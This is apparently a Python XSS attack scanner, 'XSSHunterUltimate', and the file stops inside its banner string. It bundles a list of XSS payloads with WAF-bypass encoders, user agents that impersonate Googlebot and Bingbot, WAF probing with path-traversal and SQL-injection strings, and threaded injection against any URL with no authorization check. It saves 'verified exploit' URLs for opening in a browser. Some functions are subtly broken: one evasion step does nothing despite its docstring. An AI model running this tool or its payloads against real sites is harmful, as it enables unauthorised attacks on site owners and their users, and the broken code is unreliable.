import requests
import urllib.parse
import random
import time
import json
from pathlib import Path
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
import concurrent.futures
import re
import sys

# Initialize colorama for colored console output, resetting colors automatically
init(autoreset=True)

class XSSHunterUltimate:
    """
    A robust and advanced Cross-Site Scripting (XSS) vulnerability scanner.
    It identifies XSS vulnerabilities, attempts to bypass WAFs, and verifies exploits.
    """
    def __init__(self):
        # Configuration settings for the scanner's behavior
        self.config = {
            'payloads_file': 'payloads/xss_payloads.txt',
            'timeout': 15, # Max seconds to wait for a response from the server
            'max_threads': 30, # Number of concurrent requests to speed up scanning
            'user_agents_file': 'payloads/user_agents.txt',
            'report_file': 'xss_report.json', # Detailed report format
            'verified_file': 'verified_exploits.txt', # Simple report for confirmed exploits
            'verify_exploits': True, # Enable thorough exploit verification
            'detect_waf': True # Enable Web Application Firewall detection
        }
        self.session = requests.Session() # Use a single session for connection pooling
        self.results = [] # Stores all findings (potential and verified) for JSON report
        self.verified = [] # Stores only truly verified exploits (for simple TXT output)
        self.waf_detected = False # Flag to indicate WAF presence
        self.target_url = "" # The URL currently being scanned
        
        # Setup directories and load resources upon initialization
        self._setup_directories()
        self._load_resources()

    def _setup_directories(self):
        """Ensures that the 'reports' and 'payloads' directories exist."""
        try:
            Path('reports').mkdir(exist_ok=True)
            Path('payloads').mkdir(exist_ok=True)
        except OSError as e:
            print(f"{Fore.RED}[!] Error creating directories: {e}. Please check permissions.{Style.RESET_ALL}")
            sys.exit(1) # Exit if directories cannot be created

    def _load_resources(self):
        """Loads XSS payloads, user agents, and defines evasion techniques."""
        self.payloads = self._load_payloads()
        self.user_agents = self._load_user_agents()
        # List of functions representing different evasion techniques
        self.evasion_tech = [
            self._url_encode,
            self._case_obfuscate,
            self._insert_null_bytes,
            self._add_comments_to_script,
            self._double_encode,
            self._html_entity_encode # Convert to HTML entities
        ]

    def _write_default_content(self, file_path, default_content, content_type):
        """Helper to write default content (payloads/user agents) to a file."""
        try:
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write('\n'.join(default_content))
            print(f"{Fore.YELLOW}[*] Default {content_type} written to: {file_path}{Style.RESET_ALL}")
        except IOError as e:
            print(f"{Fore.RED}[!] Error writing default {content_type} to {file_path}: {e}{Style.RESET_ALL}")

    def _load_payloads(self):
        """Loads XSS payloads from the configured file. If not found or empty, uses defaults."""
        default_payloads = [
            '<script>alert(document.domain)</script>',
            '"><script>alert(1)</script>',
            "'><script>alert(1)</script>",
            '<img src=x onerror=alert(window.location)>',
            '<svg/onload=alert(navigator.userAgent)>',
            'javascript:alert(document.cookie)',
            '<scr<script>ipt>alert(1)</script>', # WAF bypass: split script tag
            '<img src="x:gif" onerror=alert(1)>', # WAF bypass: malformed image src
            '"><img src=x onerror=alert(1)>',
            '#javascript:alert(1)', # For DOM XSS using URL fragment
            '</script><script>alert(1)</script>',
            '<body onload=alert(1)>',
            '<iframe src=javascript:alert(1)>',
            '<input autofocus onfocus=alert(1)>', # HTML5 autofocus attribute
            '<details open ontoggle="alert(1)">', # HTML5 details tag
            '<marquee onstart="alert(1)">', # Deprecated HTML tag with event
            '<video><source onerror="alert(1)">', # Video tag with error event
            '<style>@keyframes x{}@-webkit-keyframes x{}</style><body onanimationend="alert(1)" style="-webkit-animation:x;-animation:x;">', # CSS animation based XSS
            '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">', # Data URI with Base64
            '<div onmouseover="alert(1)">', # Mouseover event
            '<a href="javascript:alert(1)">Click Me</a>', # Anchor tag with JS protocol
            '<<ScRiPt>alert(1)</sCrIpT>>', # Excessive capitalization bypass
            '"><img%20src=x%20onerror=alert(1)>', # URL encoded bypass
            '<form action="javascript:alert(1)"><input type=submit value=XSS>', # Form action XSS
            '<isindex action="javascript:alert(1)" type=image>', # Obscure HTML tag
            'data:text/html,<script>alert(1)</script>', # Direct Data URI
            '<svg onload=alert(1)>', # Simple SVG payload
            '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;', # HTML entity encoded
            '%3cscript%3ealert(1)%3c/script%3e' # Fully URL encoded
        ]
        payloads_file_path = Path(self.config['payloads_file'])
        try:
            with open(payloads_file_path, 'r', encoding='utf-8') as f:
                payloads = [line.strip() for line in f if line.strip()]
                if not payloads:
                    print(f"{Fore.YELLOW}[*] Payloads file '{payloads_file_path}' is empty. Using default payloads.{Style.RESET_ALL}")
                    self._write_default_content(payloads_file_path, default_payloads, "payloads")
                    return default_payloads
                return payloads
        except FileNotFoundError:
            print(f"{Fore.YELLOW}[*] Payloads file not found: {payloads_file_path}. Creating with default payloads.{Style.RESET_ALL}")
            self._write_default_content(payloads_file_path, default_payloads, "payloads")
            return default_payloads
        except Exception as e:
            print(f"{Fore.RED}[!] Error loading payloads from {payloads_file_path}: {e}. Falling back to default payloads.{Style.RESET_ALL}")
            return default_payloads

    def _load_user_agents(self):
        """Loads user agents from the configured file. If not found or empty, uses defaults."""
        default_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15',
            'Mozilla/5.0 (Linux; Android 10; SM-G980F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59 Safari/537.36',
            'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Android 11; Mobile; rv:89.0) Gecko/89.0 Firefox/89.0',
            'Googlebot/2.1 (+http://www.google.com/bot.html)', # Mimic search engine bots
            'bingbot/2.0 (+http://www.bing.com/bingbot.htm)'
        ]
        user_agents_file_path = Path(self.config['user_agents_file'])
        try:
            with open(user_agents_file_path, 'r', encoding='utf-8') as f:
                agents = [line.strip() for line in f if line.strip()]
                if not agents:
                    print(f"{Fore.YELLOW}[*] User agents file '{user_agents_file_path}' is empty. Using default user agents.{Style.RESET_ALL}")
                    self._write_default_content(user_agents_file_path, default_agents, "user agents")
                    return default_agents
                return agents
        except FileNotFoundError:
            print(f"{Fore.YELLOW}[*] User agents file not found: {user_agents_file_path}. Creating with default user agents.{Style.RESET_ALL}")
            self._write_default_content(user_agents_file_path, default_agents, "user agents")
            return default_agents
        except Exception as e:
            print(f"{Fore.RED}[!] Error loading user agents from {user_agents_file_path}: {e}. Falling back to default user agents.{Style.RESET_ALL}")
            return default_agents

    # --- Evasion Techniques ---
    # These functions apply various encoding/obfuscation methods to payloads
    # to try and bypass Web Application Firewalls (WAFs).
    def _url_encode(self, payload):
        """URL-encodes the entire payload."""
        return urllib.parse.quote(payload)

    def _case_obfuscate(self, payload):
        """Randomly changes the case of characters in the payload (e.g., 'script' -> 'ScRiPt')."""
        return ''.join(random.choice([c.upper(), c.lower()]) for c in payload)

    def _insert_null_bytes(self, payload):
        """Inserts null bytes (percent-encoded %00) at strategic locations."""
        return payload.replace('<', '%00<').replace('>', '>%00')

    def _add_comments_to_script(self, payload):
        """Inserts HTML comments into sensitive keywords like 'script' (e.g., 'script')."""
        return re.sub(r'(s|S)cript', r'script', payload, flags=re.IGNORECASE)

    def _double_encode(self, payload):
        """Applies URL-encoding twice."""
        return urllib.parse.quote(urllib.parse.quote(payload))
    
    def _html_entity_encode(self, payload):
        """Converts specific characters to HTML entities (e.g., '<' to '&lt;')."""
        # Only encode relevant characters to avoid breaking the payload entirely
        return payload.replace('<', '&lt;').replace('>', '&gt;').replace("'", "&#39;").replace('"', "&quot;").replace('/', '&#x2F;')

    def _apply_evasion(self, payload):
        """Randomly selects and applies one of the defined evasion techniques to the payload."""
        technique = random.choice(self.evasion_tech)
        return technique(payload)

    # --- WAF Detection Logic ---
    def _check_waf(self):
        """
        Attempts to detect Web Application Firewalls (WAFs) by sending known suspicious payloads
        and analyzing server responses (status codes, headers, body content, errors).
        """
        if not self.config['detect_waf']:
            return False

        test_payloads = [
            '../../../../../etc/passwd', # Path Traversal payload
            '<script>alert("WAF_TEST_XSS")</script>', # Standard XSS payload
            "' OR 1=1 --", # SQL Injection payload
            "javascript:alert('WAF_TEST_JS')", # JS pseudo-protocol
            'UNION SELECT NULL,NULL,NULL--', # Another SQL Injection
            '<svg/onload=alert(1)>' # SVG XSS payload
        ]
        
        # Get the base URL (scheme, netloc, path) for WAF testing
        parsed_target = urllib.parse.urlparse(self.target_url)
        baseline_url = f"{parsed_target.scheme}://{parsed_target.netloc}{parsed_target.path}"

        try:
            # Send a benign request to establish a baseline and check initial connectivity
            baseline_response = self.session.get(
                baseline_url,
                headers={'User-Agent': random.choice(self.user_agents)},
                timeout=self.config['timeout']
            )
            # If the baseline itself is a client/server error, it might be a very strict WAF or network issue
            if baseline_response.status_code >= 400 and baseline_response.status_code not in [404]:
                print(f"{Fore.YELLOW}[*] Baseline request to {baseline_url} returned status {baseline_response.status_code}. This may indicate a strict WAF or network problem. Proceeding with WAF tests.{Style.RESET_ALL}")

        except requests.exceptions.RequestException as e:
            # A network error during baseline check could also imply WAF interference
            print(f"{Fore.YELLOW}[*] Network error during WAF baseline check ({e}). WAF detection might be affected.{Style.RESET_ALL}")
            # Do not return True immediately, continue with payload-specific tests

        for payload in test_payloads:
            try:
                # Append the payload to a dummy query parameter for WAF testing
                test_url = f"{baseline_url}?waf_test={urllib.parse.quote(payload)}"
                
                response = self.session.get(
                    test_url,
                    headers={'User-Agent': random.choice(self.user_agents)},
                    timeout=self.config['timeout'],
                    allow_redirects=True # Follow redirects, as some WAFs redirect blocked requests
                )
                
                # Check for common WAF-related HTTP status codes
                if response.status_code in [403, 406, 419, 501, 503, 400]:
                    print(f"{Fore.YELLOW}[*] WAF probable: Status code {response.status_code} for payload: '{payload[:50]}...'{Style.RESET_ALL}")
                    return True
                
                # Check for WAF-specific HTTP headers
                server_header = response.headers.get('Server', '').lower()
                x_waf_header = response.headers.get('X-WAF', '').lower()
                via_header = response.headers.get('Via', '').lower()
                
                waf_signature_headers = ['cloudflare', 'akamai', 'imperva', 'sucuri', 'mod_security', 'incapsula', 'fastly', 'barracuda', 'aws/waf']
                if any(waf_sig in server_header for waf_sig in waf_signature_headers) or \
                   any(waf_sig in x_waf_header for waf_sig in waf_signature_headers) or \
                   any(waf_sig in via_header for waf_sig in waf_signature_headers):
                    print(f"{Fore.YELLOW}[*] WAF probable: Specific WAF header detected for payload: '{payload[:50]}...'{Style.RESET_ALL}")
                    return True

                # Check for WAF-specific response body patterns (case-insensitive)
                waf_body_patterns = ['access denied', 'blocked by waf', 'cloudflare ray id', 'sucuri firewall', 'incapsula threat', 'mod_security was triggered', 'firewall alert']
                if any(pattern in response.text.lower() for pattern in waf_body_patterns):
                    print(f"{Fore.YELLOW}[*] WAF probable: Response body pattern detected for payload: '{payload[:50]}...'{Style.RESET_ALL}")
                    return True
                    
            except requests.exceptions.Timeout:
                # A timeout might indicate that the WAF dropped the connection
                print(f"{Fore.YELLOW}[*] WAF potential: Request timed out for payload: '{payload[:50]}...'{Style.RESET_ALL}")
                return True
            except requests.exceptions.ConnectionError:
                # A connection error might indicate the WAF actively blocked/closed the connection
                print(f"{Fore.YELLOW}[*] WAF potential: Connection error for payload: '{payload[:50]}...'{Style.RESET_ALL}")
                return True
            except Exception as e:
                # Log any other unexpected errors during WAF check but continue
                print(f"{Fore.RED}[!] Unexpected error during WAF check for payload '{payload[:50]}...': {e}{Style.RESET_ALL}")
                continue
                
        return False # No strong WAF indicators found

    # --- Response Analysis for XSS ---
    def _analyze_response(self, response, original_payload, context_payload):
        """
        Analyzes the HTTP response body for signs of XSS payload reflection or potential execution.
        This method is crucial for identifying if the injected payload had any impact.
        Args:
            response (requests.Response): The HTTP response object.
            original_payload (str): The original XSS payload (e.g., '<script>alert(1)</script>').
            context_payload (str): The exact payload string sent in the request (may be evaded/encoded).
        Returns:
            bool: True if XSS reflection or execution pattern is detected, False otherwise.
        """
        response_text = response.text
        
        # Normalize payloads for comparison (remove null bytes, non-printable chars)
        # This helps in matching if server strips some characters
        norm_original = re.sub(r'[\x00-\x1F\x7F]', '', original_payload)
        norm_context = re.sub(r'[\x00-\x1F\x7F]', '', context_payload)
        
        # 1. Direct reflection of original or sent (context) payload
        if norm_original in response_text or norm_context in response_text:
            return True
            
        # 2. Reflection of URL-decoded versions (server might decode once)
        # This covers cases where the server decodes the input before reflecting it.
        try:
            decoded_original = urllib.parse.unquote(norm_original)
            if decoded_original in response_text:
                return True
        except Exception: pass # Ignore decoding errors
        
        try:
            decoded_context = urllib.parse.unquote(norm_context)
            if decoded_context in response_text:
                return True
        except Exception: pass

        # 3. Reflection within common HTML/JS contexts using regular expressions.
        # These regexes are designed to catch XSS even if the payload is slightly malformed or split.
        
        # Check for reflection within a <script> tag (case-insensitive, multiline)
        script_pattern = r'<script[^>]*>.*?(' + re.escape(norm_original) + '|' + re.escape(norm_context) + ').*?</script>'
        if re.search(script_pattern, response_text, re.I | re.DOTALL):
            return True

        # Check for reflection within HTML event handlers (e.g., onload, onerror, onclick)
        event_handler_pattern = r'on\w+\s*=\s*["\']?[^"\']*(' + re.escape(norm_original) + '|' + re.escape(norm_context) + ').*?[\'"]?'
        if re.search(event_handler_pattern, response_text, re.I):
            return True

        # Check for reflection within JavaScript URI schemes (e.g., href="javascript:alert(1)")
        js_uri_pattern = r'javascript:\s*(' + re.escape(norm_original) + '|' + re.escape(norm_context) + ')'
        if re.search(js_uri_pattern, response_text, re.I):
            return True
            
        # Check for reflection in common HTML attributes that can lead to XSS
        # Example: <img src="XSS_HERE">, <link rel="stylesheet" href="XSS_HERE">
        attribute_reflection_pattern = r'(href|src|data|style)\s*=\s*["\']?[^"\']*(' + re.escape(norm_original) + '|' + re.escape(norm_context) + ').*?[\'"]?'
        if re.search(attribute_reflection_pattern, response_text, re.I):
            return True

        # 4. Basic DOM analysis using BeautifulSoup.
        # This attempts to parse the HTML and check if the payload appears in structured ways.
        try:
            soup = BeautifulSoup(response_text, 'html.parser')
            
            # Check for reflection within script tag contents or source attributes
            for script_tag in soup.find_all('script'):
                if script_tag.string and (norm_original in script_tag.string or norm_context in script_tag.string):
                    return True
                if script_tag.get('src') and (norm_original in script_tag.get('src') or norm_context in script_tag.get('src')):
                    return True
            
            # Check for reflection in attributes of ALL HTML tags
            for tag in soup.find_all(True): # Iterate over all tags
                for attr, value in tag.attrs.items():
                    if isinstance(value, str): # Ensure attribute value is a string
                        if norm_original in value or norm_context in value:
                            # Consider common XSS vector attributes (href, src, style, any 'on' attribute)
                            if attr.lower() in ['href', 'src', 'style', 'value', 'data'] or attr.lower().startswith('on'):
                                return True
        except Exception as e:
            # print(f"{Fore.RED}[!] Error during BeautifulSoup parsing: {e}{Style.RESET_ALL}")
            pass # Continue if parsing fails, as regex might still catch it
            
        return False # No XSS reflection or execution pattern found

    # --- Browser Simulation (Headless) ---
    def _test_in_browser(self, url, original_payload):
        """
        Simulates browser-like behavior by sending an HTTP request with common browser headers.
        The response is then analyzed to determine if the XSS payload would likely execute.
        This is a 'headless' check, not involving a real browser instance.
        Args:
            url (str): The URL constructed with the payload to be tested.
            original_payload (str): The initial XSS payload (for analysis purposes).
        Returns:
            bool: True if the payload's reflection/execution pattern is detected, False otherwise.
        """
        try:
            response = self.session.get(
                url,
                headers={
                    'User-Agent': random.choice(self.user_agents),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Referer': urllib.parse.urlparse(self.target_url)._replace(query='', fragment='').geturl(), # Base URL as referrer
                    'DNT': '1', # Do Not Track header
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1' # Ask for HTTPS
                },
                timeout=self.config['timeout'],
                allow_redirects=True # Follow any redirects a browser would
            )
            # Analyze the response to see if the payload is reflected or shows signs of execution
            return self._analyze_response(response, original_payload, original_payload)
        except requests.exceptions.RequestException:
            return False # Request failed (e.g., network error, timeout)
        except Exception:
            return False # Other unexpected errors during the request

    # --- Exploit Verification ---
    def _verify_exploit(self, param, original_payload):
        """
        Conducts a thorough verification of a potential XSS vulnerability.
        It tries multiple variations of the payload (encoding, context, alternative functions)
        to confirm actual exploitability in a browser-like environment.
        Args:
            param (str): The name of the parameter where the XSS was potentially found.
            original_payload (str): The initial XSS payload (e.g., '<script>alert(1)</script>').
        Returns:
            str or None: The exact URL that successfully verified the exploit, or None if no
                         variation confirmed the vulnerability.
        """
        # Generate variations of the original payload for robust testing
        # Replace 'alert' with 'prompt' or 'confirm' to bypass client-side filters specific to 'alert'
        verification_payloads_base = [
            original_payload,
            original_payload.replace('alert(', 'prompt(').replace('alert ', 'prompt ').replace('alert`', 'prompt`'),
            original_payload.replace('alert(', 'confirm(').replace('alert ', 'confirm ').replace('alert`', 'confirm`'),
        ]
        
        test_attempts = []
        # Get the base URL without any query parameters for constructing clean test URLs
        base_url_no_query = urllib.parse.urlparse(self.target_url)._replace(query='', fragment='').geturl()

        for vp in verification_payloads_base:
            # 1. Standard URL-encoded payload
            encoded_vp = urllib.parse.quote(vp)
            test_attempts.append(f"{base_url_no_query}?{param}={encoded_vp}")
            
            # 2. Double URL-encoded payload
            double_encoded_vp = urllib.parse.quote(encoded_vp)
            test_attempts.append(f"{base_url_no_query}?{param}={double_encoded_vp}")

            # 3. HTML entity encoded payload (then URL-encoded for URL safety)
            html_encoded_vp = self._html_entity_encode(vp)
            test_attempts.append(f"{base_url_no_query}?{param}={urllib.parse.quote(html_encoded_vp)}")

        # Add contextual payloads that are often successful for verification in different HTML contexts
        contextual_payloads_for_verification = [
            f'<img src=x onerror={original_payload.replace("alert(", "alert`").replace(")", "`")}>',
            f'<svg/onload={original_payload.replace("alert(", "alert`").replace(")", "`")}>',
            f'"><svg/onload={original_payload.replace("alert(", "alert`").replace(")", "`")}>', # Break out of attribute
            f'\'><svg/onload={original_payload.replace("alert(", "alert`").replace(")", "`")}>', # Break out of attribute
            f'javascript:{original_payload}', # For "javascript:" protocol contexts in href/src
            f'<a href="javascript:{original_payload}">XSS</a>',
            f'<body onload={original_payload.replace("alert(", "alert`").replace(")", "`")}>',
            f'<div style="x:expression({original_payload.replace("alert(", "alert(").replace(")", ")")})"></div>', # CSS expression (IE only, but good for testing)
        ]
        for cp in contextual_payloads_for_verification:
            test_attempts.append(f"{base_url_no_query}?{param}={urllib.parse.quote(cp)}")
            test_attempts.append(f"{base_url_no_query}?{param}={urllib.parse.quote(urllib.parse.quote(cp))}") # Double encode

        # Iterate through all unique test URLs and check for verification
        for attempt_url in sorted(list(set(test_attempts))): # Sort for consistent testing order
            if self._test_in_browser(attempt_url, original_payload):
                return attempt_url # Return the first URL that successfully verified the exploit
                
        return None # No verification succeeded after all attempts

    # --- Core Payload Testing ---
    def _test_payload(self, param, original_payload):
        """
        Sends a single XSS payload to a given URL parameter and analyzes the response.
        This is the main function executed concurrently by threads.
        Args:
            param (str): The name of the URL parameter to inject into.
            original_payload (str): The XSS payload string to inject.
        Returns:
            dict or None: A dictionary containing details of the scan result if a potential
                          vulnerability is found, or None otherwise.
        """
        try:
            # Apply a random evasion technique to the payload
            evaded_payload = self._apply_evasion(original_payload)
            
            # Construct the test URL
            base_url_no_query = urllib.parse.urlparse(self.target_url)._replace(query='', fragment='').geturl()
            test_url_sent = f"{base_url_no_query}?{param}={urllib.parse.quote(evaded_payload)}"
            
            # Send the GET request with the evaded payload
            response = self.session.get(
                test_url_sent,
                headers={'User-Agent': random.choice(self.user_agents)},
                timeout=self.config['timeout']
            )
            
            # Analyze the HTTP response for signs of XSS reflection
            if self._analyze_response(response, original_payload, evaded_payload):
                verified_url = None
                # If exploit verification is enabled, perform a thorough verification
                if self.config['verify_exploits']:
                    verified_url = self._verify_exploit(param, original_payload)
                
                # Create a result dictionary with all relevant information
                result = {
                    'param': param,
                    'original_payload': original_payload,
                    'evaded_payload_sent': evaded_payload,
                    'url_sent_for_detection': test_url_sent,
                    'http_status_code_detection': response.status_code,
                    'status': 'Vulnerable',
                    'verified_url': verified_url # The URL that confirmed the exploit, or None
                }
                
                # If a verified URL was found, add this result to the list of confirmed exploits
                if verified_url:
                    self.verified.append(result)
                
                return result # Return the result for inclusion in the comprehensive JSON report
                
        except requests.exceptions.RequestException as e:
            # Handle network-related errors (e.g., connection refused, DNS error, timeout)
            return {
                'param': param,
                'original_payload': original_payload,
                'status': 'Error',
                'error': f"Request failed: {type(e).__name__} - {str(e)}",
                'url_attempted': f"{urllib.parse.urlparse(self.target_url)._replace(query='', fragment='').geturl()}?{param}={urllib.parse.quote(original_payload)}"
            }
        except Exception as e:
            # Catch any other unexpected errors during the payload test
            return {
                'param': param,
                'original_payload': original_payload,
                'status': 'Error',
                'error': f"Unexpected error: {type(e).__name__} - {str(e)}",
                'url_attempted': f"{urllib.parse.urlparse(self.target_url)._replace(query='', fragment='').geturl()}?{param}={urllib.parse.quote(original_payload)}"
            }
            
        return None # No vulnerability or error detected for this combination

    # --- Parameter Extraction ---
    def _extract_params(self, url):
        """
        Extracts all identifiable parameters from a given URL.
        This includes parameters from the query string (e.g., ?id=123) and
        heuristically attempts to identify parameters from the URL path (e.g., /product/123).
        Args:
            url (str): The target URL.
        Returns:
            list: A list of unique parameter names identified.
        """
        extracted_params = set()
        parsed_url = urllib.parse.urlparse(url)
        
        # 1. Extract parameters from the query string (most common XSS location)
        query = parsed_url.query
        if query:
            # urllib.parse.parse_qs returns a dictionary where keys are parameter names
            query_params = urllib.parse.parse_qs(query)
            extracted_params.update(query_params.keys())
        
        # 2. Heuristically extract parameters from URL path segments.
        # This helps with "clean" URLs (e.g., /article/123, where 123 might be 'id')
        path_segments = [seg for seg in parsed_url.path.split('/') if seg] # Split path into segments
        if path_segments:
            # Iterate through segments, looking for patterns that suggest a parameter
            for i, segment in enumerate(path_segments):
                # If a segment is numeric, it's very likely an ID
                if segment.isdigit() and len(segment) > 0:
                    # Add 'id' as a generic parameter name
                    extracted_params.add('id') 
                    # If the preceding segment looks like a category/type, add that too
                    if i > 0 and len(path_segments[i-1]) > 1 and path_segments[i-1].isalpha():
                         extracted_params.add(path_segments[i-1]) # E.g., /product/123 -> 'product'
                
                # If a segment looks like a slug or a textual identifier
                elif re.match(r'^[a-zA-Z0-9_-]+$', segment) and len(segment) > 1:
                    # Exclude common static page names
                    if segment.lower() not in ['index', 'home', 'about', 'contact', 'login', 'register', 'admin', 'dashboard', 'api']:
                         extracted_params.add(segment)

        # 3. Add a set of common default parameters if few or no parameters were found.
        # This ensures a baseline level of testing even on URLs without clear params.
        if not extracted_params:
            print(f"{Fore.YELLOW}[*] No distinct query or path parameters found in URL. Using common default parameters for XSS testing.{Style.RESET_ALL}")
            # Common parameters often used in web applications
            extracted_params.update(['q', 'id', 'search', 'name', 'query', 'view', 'page', 'item', 'category', 'product_id', 'article_id', 'post_id', 'key', 'value', 'data'])
            
        return list(extracted_params) # Convert set to list for consistent return type

    # --- Reporting and Output ---
    def _save_results(self):
        """Saves the scan results into detailed JSON and simplified TXT formats."""
        Path('reports').mkdir(exist_ok=True) # Ensure reports directory exists

        # Save detailed JSON report
        json_report_path = Path('reports') / self.config['report_file']
        try:
            with open(json_report_path, 'w', encoding='utf-8') as f:
                json.dump({
                    'target': self.target_url,
                    'waf_detected': self.waf_detected,
                    'all_findings': self.results, # All test results, including errors
                    'verified_exploits_detailed': self.verified, # Only verified exploits, with full details
                    'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
                }, f, indent=2, ensure_ascii=False) # ensure_ascii=False for proper display of non-ASCII chars
            print(f"{Fore.GREEN}[+] Detailed JSON report saved to: reports/{self.config['report_file']}{Style.RESET_ALL}")
        except IOError as e:
            print(f"{Fore.RED}[!] Error saving JSON report to {json_report_path}: {e}{Style.RESET_ALL}")

        # Save simplified TXT report specifically for verified exploits
        verified_exploits_path = Path('reports') / self.config['verified_file']
        try:
            with open(verified_exploits_path, 'w', encoding='utf-8') as f:
                f.write("XSS Hunter Ultimate - Verified Exploits\n")
                f.write("=======================================\n\n")
                if self.verified:
                    f.write("Congratulations! The following URLs are highly likely to be vulnerable to XSS.\n")
                    f.write("Instructions:\n")
                    f.write("1. Copy any of the URLs below.\n")
                    f.write("2. Paste it directly into your web browser's address bar.\n")
                    f.write("3. If a pop-up window (like an 'alert', 'prompt', or 'confirm' dialog) appears, the XSS vulnerability is successfully exploited!\n\n")
                    f.write("--- Verified XSS URLs ---\n")
                    for i, v in enumerate(self.verified):
                        if v.get('verified_url'): # Ensure the verified_url key exists and is not None
                            f.write(f"[{i+1}] {v['verified_url']}\n")
                            f.write("-" * min(len(v['verified_url']), 70) + "\n") # Limit line length for formatting
                    f.write("\n=======================================\n")
                    f.write(f"Total Verified Exploits: {len(self.verified)}\n")
                else:
                    f.write("No Verified XSS Exploits Found.\n")
                    f.write("-------------------------------------\n")
                    f.write("This means no XSS vulnerabilities were definitively confirmed by the scanner for the provided URL.\n")
                    f.write("Possible reasons:\n")
                    f.write("- The target is not vulnerable to the tested payloads.\n")
                    f.write("- A Web Application Firewall (WAF) successfully blocked the payloads.\n")
                    f.write("- More advanced or highly specific payloads/techniques are required.\n")
                    f.write("- The vulnerability is DOM-based and requires more complex client-side interaction (consider manual testing).\n\n")
                    f.write(f"A detailed JSON report with all findings (potential and errors) is available at: reports/{self.config['report_file']}\n")
            print(f"{Fore.GREEN}[+] Verified exploits saved to: reports/{self.config['verified_file']}{Style.RESET_ALL}")
        except IOError as e:
            print(f"{Fore.RED}[!] Error saving verified exploits report to {verified_exploits_path}: {e}{Style.RESET_ALL}")

    # --- Main Scan Execution ---
    def scan(self, url):
        """
        Initiates and manages the XSS scan process for the given URL.
        Args:
            url (str): The target URL to scan.
        """
        self.target_url = url
        print(f"\n{Fore.CYAN}[*] Starting XSS scan on: {url}{Style.RESET_ALL}")
        
        # Perform WAF detection
        self.waf_detected = self._check_waf()
        print(f"{Fore.YELLOW}[*] WAF Detection: {'Yes (potential)' if self.waf_detected else 'No (or not detected)'}{Style.RESET_ALL}")
        if self.waf_detected:
            print(f"{Fore.YELLOW}[!] A WAF might be active. This could affect scan results and potentially lead to blocks.{Style.RESET_ALL}")
        
        # Extract parameters for testing
        params = self._extract_params(url)
        if not params:
            print(f"{Fore.RED}[!] No usable parameters found for XSS testing in the provided URL. Please ensure the URL contains query parameters (e.g., http://example.com/search?q=test) or dynamic path segments (e.g., http://example.com/product/123).{Style.RESET_ALL}")
            print(f"{Fore.RED}[!] Exiting scan.{Style.RESET_ALL}")
            return # Exit if no parameters can be identified

        print(f"{Fore.BLUE}[*] Identified parameters for testing: {', '.join(params)}{Style.RESET_ALL}")
        print(f"{Fore.BLUE}[*] Initiating scan with {len(self.payloads)} payloads across {len(params)} parameters. This may take some time...{Style.RESET_ALL}")
        
        start_time = time.time() # Record start time for duration calculation
        
        # Use a ThreadPoolExecutor to run payload tests concurrently
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.config['max_threads']) as executor:
            futures = []
            # Submit a test task for each parameter-payload combination
            for param in params:
                for payload in self.payloads:
                    futures.append(executor.submit(self._test_payload, param, payload))
            
            # As tasks complete, process their results
            for future in concurrent.futures.as_completed(futures):
                result = future.result() # Get the result from the completed future
                if result:
                    self.results.append(result) # Add all results to the comprehensive list
                    # If a verified exploit is found, print it immediately to the console
                    if result['status'] == 'Vulnerable' and result['verified_url']:
                        print(f"{Fore.GREEN}[✓] VERIFIED XSS Found! {Fore.MAGENTA}{result['verified_url']}{Style.RESET_ALL}")
                
        # After all tests are done, save the results to files
        self._save_results()
        
        # Print a summary of the scan results
        print(f"\n{Fore.CYAN}[*] XSS scan completed in {time.time()-start_time:.2f} seconds.{Style.RESET_ALL}")
        if self.verified:
            print(f"{Fore.MAGENTA}[✓] {len(self.verified)} VERIFIED XSS exploits found!{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[!] Verified exploit URLs (ready for browser testing) saved to: reports/{self.config['verified_file']}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}\n[INFO] **ACTION REQUIRED:** To confirm the XSS vulnerability, copy any URL from '{self.config['verified_file']}' and paste it into your web browser's address bar.{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}[+] No VERIFIED XSS exploits found.{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[!] A detailed JSON report with all test results (including potential findings and errors) is available at: reports/{self.config['report_file']}{Style.RESET_ALL}")
        
        print(f"{Fore.CYAN}\n[INFO] Please check the 'reports' directory for full details and confirmed XSS URLs.{Style.RESET_ALL}")


if __name__ == "__main__":
    # Display a welcome banner when the script starts
    banner = f"""{Fore.RED}
███████╗██╗  ██╗███████╗███████╗    ██╗  ██╗███████╗██╗    ██╗███████╗███████╗███████╗
╚══███╔╝╚██╗██╔╝██╔════╝██╔════╝    ██║  ██║██╔════╝██║    ██║██╔════╝██╔════╝██╔════╝
  ███╔╝  ╚███╔╝ █████╗  ███████╗    ███████║█████╗  ██║ █╗ ██║█████╗  ███████╗███████╗
 ███╔╝   ██╔██╗ ██╔══╝  ╚════██║    ██╔══██║██╔══╝  ██║███╗██║██╔══╝  ╚════██║╚════██║
███████╗██╔╝ ██╗███████╗███████║    ██║  ██║███████╗╚███╔███╔╝███████╗███████║███████║
